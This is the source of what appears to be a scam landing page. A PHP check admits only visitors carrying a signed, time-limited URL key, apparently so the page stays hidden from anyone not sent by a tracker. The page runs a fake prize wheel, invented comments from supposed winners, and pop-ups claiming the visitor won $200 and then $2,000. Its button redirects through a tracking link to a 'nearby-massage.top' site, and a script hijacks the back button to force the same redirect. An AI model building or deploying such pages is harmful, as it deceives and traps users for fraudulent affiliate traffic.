
<?php
    const PROTECTION_TOKEN = 'MWI1ZmJkY2ViZjNjNTg3NzlmNzVjM2M1ZDYwYzY0YWM='; // Your landing protection token
    const KEY_TTL = '30 minutes'; // How long KEY should be valid. Valid formats are explained here: http://php.net/manual/en/datetime.formats.php
    const KEY_GET_PARAM = 'key'; // GET parameter with Skro landing key.

    $key = isset($_GET[KEY_GET_PARAM]) ? rawurldecode($_GET[KEY_GET_PARAM]) : exit('Access denied');
    if (!$key = base64_decode($key)) {
        exit('Access denied');
    }
    if (!$key = json_decode($key, true)) {
        exit('Access denied');
    }
    if (!isset($key['timestamp']) || !isset($key['hash'])) {
        exit('Access denied');
    }
    $signedHash = hash_hmac('sha1', $key['timestamp'], PROTECTION_TOKEN);
    if ($signedHash !== $key['hash'] || strtotime(KEY_TTL, $key['timestamp']) < time()) {
        exit('Access denied');
    }
?>
    
<html xmlns="http://www.w3.org/1999/xhtml" class="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<script type="text/javascript">var ip = "";</script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link type="text/css" rel="stylesheet" charset="UTF-8" href="css/index.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
	<link href="css/sweetalert.css" rel="stylesheet" type="text/css">
	<style type="text/css">*[attr-cou]{ display: none !important; } *[attr-lan]{ display: none !important; } .forceDisplay{ display: block !important; } .forceDisplayInline{ display: inline-block !important; } </style>

</head>

<body>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport">
<title>Congratulations!</title>

<div id="a-nav">
<div class="icon-nav"></div>
<h1>Congratulations!</h1>
<div class="icon-basket"></div>
</div>
<main>
<div class="content">
<div class="main-content" id="content1">

<center style="padding-top:10px; color:white;">
<strong>You can win a special prize today!</strong>
</center>
<strong>
<div id="spinner">
<img id="spinBG" src="images/11.png">
<img id="spin" src="images/aespinner.png">
<img id="win" onclick="" src="images/spin.png">
<img class="animated rotateIn" id="iphone" src="images/arprize.png">
</div>

<div class="comments1">
<div><small><span id="likes" class="like">1,221</span> likes</small>
</div>
<div><span class="photo p1">
<img src="images/1.png"></span>
<div class="commentsblock"><b>Michael Lucas</b>
<p>I received it today, i'm so happy!</p><small><span class="like">Like</span> · <u>4 minutes </u></small>
</div>
</div>
<div><span class="photo p2">
<img src="images/2.png"></span>
<div class="commentsblock"><b>Kyle Kelly</b>
<p>No prize for me... can I have another chance?</p><small><span class="like">Like</span> · <u>5 minutes </u></small>
</div>
</div>
<div><span class="photo p3">
<img src="images/3.png"></span>
<div class="commentsblock"><b>Andrew Miller</b>
<p>I won!! Thanks!</p>
<small><span class="like">Like</span> · <u>11 minutes </u></small>
</div>
</div>
<div><span class="photo p4">
<img src="images/4.png"></span>
<div class="commentsblock"><b>Raymond Bush</b>
<p> I won! Wooooooo</p><small><span class="like">Like</span> · <u>15 minutes</u></small>
</div>
</div>
<div><span class="photo p5">
<img src="images/5.png"></span>
<div class="commentsblock"><b>Enrique Morales</b>
<p>This is amazing I can't wait to play!</p><small><span class="like">Like</span> · <u>38 minutes</u></small>
</div>
</div>
<div><span class="photo p6">
<img src="images/6.png"></span>
<div class="commentsblock"><b>Thomas Miles</b>
<p>Call me a sore loser, because I really wanted it!</p><small><span class="like">Like</span> · <u>45 minutes</u></small>
</div>
</div>
<div><span class="photo p7">
<img src="images/7.png"></span>
<div class="commentsblock"><b>Samuel Hudson</b>
<p>That was so easy, I won!!!!</p><small><span class="like">Like</span> · <u>1 hour</u></small>
</div>
</div>
<div><span class="photo p8">
<img src="images/8.png"></span>
<div class="commentsblock"><b>Anna Nelson </b>
<p>I've never won anything, but I hope I'm lucky!</p><small><span class="like">Like</span> · <u>1 hour</u></small>
</div>
</div>
</div>


</strong>
</div>
</div>
</main>


<strong>
<div class="sweet-overlay" style="opacity: 1.03; display: block;" tabindex="-1"></div>
<div class="sweet-alert animated bounceIn visible" id="modal01">
<h2 style="margin-top:30px;"> Congratulations!  </h2>
<p> Each month we select one lucky customer to win a prize. </p>
<div class="sa-button-container">
<div class="sa-confirm-button-container">
<button onclick="hidemodal01()" style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color: #25189B;">OK</button>


<div class="la-ball-fall"></div>
</div>
</div>
</div>
<div class="sweet-alert animated bounceIn" id="modal02">
<div class="sa-icon sa-success" id="success02">
<span class="sa-line sa-tip" id="successtip02"></span>
<span class="sa-line sa-long" id="successlong02"></span>
<div class="sa-placeholder"></div>
<div class="sa-fix"></div>
</div>
<h2> You just won $200...want to try again? </h2>
<p>  </p>
<div class="sa-button-container">
<div class="sa-confirm-button-container">
<button onclick="hidemodal02()" style="display: inline-block; box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color:#25189B">OK</button>
<div class="la-ball-fall"></div>
</div>
</div>
</div>
<div class="sweet-alert animated bounceIn" id="modal03">
<div class="sa-icon sa-success" id="success03">
<span class="sa-line sa-tip" id="successtio03"></span>
<span class="sa-line sa-long" id="successlong03"></span>
<div class="sa-placeholder"></div>
<div class="sa-fix"></div>
</div>
<h2> Congratulations! </h2>
<p>You win $2,000!
<br> To get the amount, complete 2 steps:
<br>Step 1: Register and use our products.
<br>Step 2: You will get bonus in three days.
</p>
<div class="sa-button-container">
<div class="sa-confirm-button-container">
<button style="display: inline-block;box-shadow: rgba(140, 212, 245, 0.8) 0px 0px 2px, rgba(0, 0, 0, 0.0470588) 0px 0px 0px 1px inset; background-color:#25189B;">
	<a href="https://skrotrack.com/click" target="_blank" onclick="setTimeout(function() { window.location = 'https://nearby-massage.top'; }, 100);" style="padding:0px;margin:0;border:0px;">OK</a>
</button>
<div class="la-ball-fall"></div>

				<script>
					function hidemodal01(){
						$('#modal01').removeClass('visible');
						$('.sweet-overlay').css('display','none');
						$('#spin').addClass('spinAround');
						$('#xmas').css('display','none');
						setTimeout(function () {
							$('#modal02').addClass('visible');
							$('.sweet-overlay').css('display','block');
							$('#xmas').css('display','block');
							$('#xmas').css('top','calc(50% - 210px)');
							setTimeout(function () {
								$('#success02').addClass('animate');
								$('#successtip02').addClass('animateSuccessTip');
								$('#successlong02').addClass('animateSuccessLong');
							}, 500);
						}, 7500);
					}

					function hidemodal02(){
						$('#modal02').removeClass('visible');
						$('.sweet-overlay').css('display','none');
						$('#spin').addClass('spinAround2');
						$('#xmas').css('display','none');
						setTimeout(function () {
							$('#iphone').css('display','block');
						}, 7000);
						setTimeout(function () {
							$('#modal03').addClass('visible');
							$('.sweet-overlay').css('display','block');
							$('#xmas').css('display','block');
							$('#xmas').css('top','calc(50% - 210px)');
							setTimeout(function () {
								$('#success03').addClass('animate');
								$('#successtip03').addClass('animateSuccessTip');
								$('#successlong03').addClass('animateSuccessLong');
							}, 500);
						}, 8000);
					}
				</script>
				<script>
    // 当页面加载完成时，立即向history栈添加一个状态
    history.pushState(null, null, location.href);
    
    window.onpopstate = function(event) {
        // 这里处理用户点击浏览器后退按钮的情况
        // 重定向用户到指定页面, 比如 Google
        location.href = 'https://skrotrack.com/click';
        // 或者重定向用户到他们之前的页面
        // history.go(-1);
    }
</script>

</body>

</html> 